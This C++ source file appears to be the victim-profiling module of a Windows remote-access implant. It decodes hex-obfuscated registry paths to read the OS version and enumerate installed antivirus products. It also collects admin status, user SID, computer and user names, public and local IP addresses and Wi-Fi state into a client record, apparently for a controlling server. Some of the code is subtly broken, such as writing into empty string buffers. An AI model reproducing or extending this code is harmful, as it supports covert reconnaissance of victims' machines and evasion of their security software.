#define MAX_KEY_LENGTH 255
#include "SystemInformation.h"

GetInfoLocal::GetInfoLocal(HINTERNET clientRequestSession)
{
	session = clientRequestSession;
}

string GetInfoLocal::getOs()
{
	char value[400];
	string fullOs = "";
	DWORD bufferSize = 5000;
	string var = Encryptions::hexToAscii("534f4654574152455c5c4d6963726f736f66745c5c57696e646f7773204e545c5c43757272656e7456657273696f6e");
	if (RegGetValueA(HKEY_LOCAL_MACHINE, (LPCSTR)var.c_str(), (LPCSTR)"ProductName", RRF_RT_ANY, NULL, (PVOID)&value, &bufferSize) == ERROR_SUCCESS)
	{
		fullOs = string(value) + '-';
		ZeroMemory(value, sizeof(value));
		if (RegGetValueA(HKEY_LOCAL_MACHINE, (LPCSTR)var.c_str(), ("ReleaseId"), RRF_RT_ANY, NULL, (PVOID)&value, &bufferSize) == ERROR_SUCCESS)
		{
			fullOs += value;
			return fullOs;
		}
	}
	return "";
}

void GetInfoLocal::getHostName()
{
	int nameType = 0;
	string computerName;
	string username;
	DWORD dwSize = sizeof(computerName);
	if (!GetComputerNameExA((COMPUTER_NAME_FORMAT)nameType, &computerName[0], &dwSize))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return;
	}
	dwSize = sizeof(username);
	if (!GetUserNameA(&username[0], &dwSize))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return;
	}
	string fullHostName;
	fullHostName = fullHostName + &computerName[0] + "\\\\" + &username[0];
	tempStructer.computername = fullHostName;
	tempStructer.username = &username[0];
}

string GetInfoLocal::ifAdmin()
{
	if (IsUserAnAdmin())
		return "True";
	else
		return "False";
}

string GetInfoLocal::GetClientSID(string username)
{
	UCHAR psnuType[2048];
	string lpszDomain;
	DWORD dwDomainLength = 250;
	UCHAR UserSID[1024];
	DWORD dwSIDBufSize = 1024;
	LPSTR sidString;
	if (!LookupAccountNameA((LPSTR)NULL,&username[0],UserSID,&dwSIDBufSize,&lpszDomain[0],&dwDomainLength,(PSID_NAME_USE)psnuType))
		return "";
	else
	{
		if (!ConvertSidToStringSidA(UserSID, &sidString))
			return "";
		return sidString;
	}
}

string GetInfoLocal::getPublicIP()
{
	HttpRequests WinHttpRequests;
	string domain = "ipinfo.io";
	wstring wDomain(domain.begin(), domain.end());
	HINTERNET tempSession = WinHttpRequests.createFirstConnection(wDomain.c_str());
	if (tempSession == NULL)
		return NULL;
	string publicIp = WinHttpRequests.SendGetRequest("/ip", tempSession);
	WinHttpCloseHandle(tempSession);
	return publicIp;
}

vector<string> GetInfoLocal::getLocalIP()
{
	vector<string> allIP;
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;
	string IPv4;
	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		#ifdef _DEBUG
			Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
	}
	else
	{
		if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
		{
			FREE(pAdapterInfo);
			pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
			if (pAdapterInfo == NULL) {
				#ifdef _DEBUG
					Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
				#endif
			}
			else
			{
				if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
					pAdapter = pAdapterInfo;
					while (pAdapter) {
						pAdapter->IpAddressList.IpAddress.String;
						allIP.push_back(pAdapter->IpAddressList.IpAddress.String);
						pAdapter = pAdapter->Next;
					}
				}
				else {
				#ifdef _DEBUG
					Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
				#endif
				}
			}
		}
		else {
			pAdapter = pAdapterInfo;
			pAdapter->IpAddressList.IpAddress.String;
			allIP.push_back(pAdapter->IpAddressList.IpAddress.String);
			FREE(pAdapterInfo);
			return allIP;
		}
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);
	return allIP;
}

string GetStringRegKey(HKEY hKey, const std::wstring& strValueName)
{
	WCHAR szBuffer[512];
	DWORD dwBufferSize = sizeof(szBuffer);
	if(RegQueryValueExW(hKey, strValueName.c_str(), 0, NULL, (LPBYTE)szBuffer, &dwBufferSize) == ERROR_SUCCESS)
	{
		wstring ws(szBuffer);
		return string(ws.begin(), ws.end());
	}
	return "";
}

void QueryAvKey(HKEY hKey,vector<string> & listAvs)
{
	TCHAR    achKey[MAX_KEY_LENGTH];   
	DWORD    cbName;    
	TCHAR    achClass[MAX_PATH] = TEXT("");  
	DWORD    cchClassName = MAX_PATH;  
	DWORD    cSubKeys = 0;         
	DWORD    cbMaxSubKey;          
	DWORD    cchMaxClass;  
	DWORD    cValues;            
	DWORD    cchMaxValue;        
	DWORD    cbMaxValueData;     
	DWORD    cbSecurityDescriptor; 
	FILETIME ftLastWriteTime;
	DWORD i, retCode;


	retCode = RegQueryInfoKey(
		hKey, 
		achClass,        
		&cchClassName,
		NULL,                   
		&cSubKeys,            
		&cbMaxSubKey,            
		&cchMaxClass,       
		&cValues,          
		&cchMaxValue,        
		&cbMaxValueData, 
		&cbSecurityDescriptor, 
		&ftLastWriteTime); 

	if (cSubKeys)
	{
		for (i = 0; i < cSubKeys; i++)
		{
			cbName = MAX_KEY_LENGTH;
			retCode = RegEnumKeyEx(hKey, i,
				achKey,
				&cbName,
				NULL,
				NULL,
				NULL,
				&ftLastWriteTime);
			if (retCode == ERROR_SUCCESS)
			{
				HKEY hKey;
				wstring fullPath = Utils::s2ws(Encryptions::hexToAscii("534F4654574152455C5C4D6963726F736F66745C5C53656375726974792043656E7465725C5C50726F76696465725C5C41765C5C")).c_str()  + wstring(achKey);
				if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, (LPCWSTR)fullPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
				{
					string currentAv = GetStringRegKey(hKey, L"DISPLAYNAME");
					if(!currentAv.empty())
						listAvs.push_back(currentAv);
				}
			}
		}
	}
}

vector<string> getAV()
{
	HKEY avKey;
	vector<string> listAvs;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,Utils::s2ws(Encryptions::hexToAscii("534F4654574152455C5C4D6963726F736F66745C5C53656375726974792043656E7465725C5C50726F76696465725C5C4176").c_str()).c_str(),0, KEY_READ, &avKey) == ERROR_SUCCESS)
		QueryAvKey(avKey, listAvs);
	RegCloseKey(avKey);
	return listAvs;
}

PublicStructers::client GetInfoLocal::get_local_info()
{
	PublicStructers::client clientInfo;
	clientInfo.OS = getOs();
	clientInfo.listAvs = getAV();
	getHostName();
	clientInfo.computer = tempStructer.computername;
	clientInfo.username = tempStructer.username;
	clientInfo.isA = ifAdmin();
	clientInfo.sID = GetClientSID(tempStructer.username);
	string publicIP = getPublicIP();
	publicIP.erase(remove(publicIP.begin(), publicIP.end(), '\n'), publicIP.end());
	clientInfo.globalIp = publicIP;
	clientInfo.IPv4 = getLocalIP();
	if (Wifi.GetWifiStatus())
		clientInfo.ifWifi = true;
	else
		clientInfo.ifWifi = false;
	return clientInfo;
}

string GetInfoLocal::full_network_info()
{
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;
	string buffer;
	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return NULL;
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
#ifdef _DEBUG
			Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
			return NULL;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		int id = 1;
		while (pAdapter) {
			buffer += "Adapter " + to_string(id) + " - \\n";
			buffer += "[*] Adapter Desc -  " + string(pAdapter->Description) + "\\n" +
				"[*] IP Address - " + pAdapter->IpAddressList.IpAddress.String + "\\n" +
				"[*] IP Address - " + pAdapter->IpAddressList.IpAddress.String + "\\n" +
				"[*] IP Mask - " + pAdapter->IpAddressList.IpMask.String + "\\n" +
				"[*] Gateway - " + pAdapter->GatewayList.IpAddress.String + "\\n\\n";
			id += 1;
			pAdapter = pAdapter->Next;
		}
	}
	else {
		buffer += "GetAdaptersInfo failed with error: " + to_string(dwRetVal);
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);
	return buffer;
}

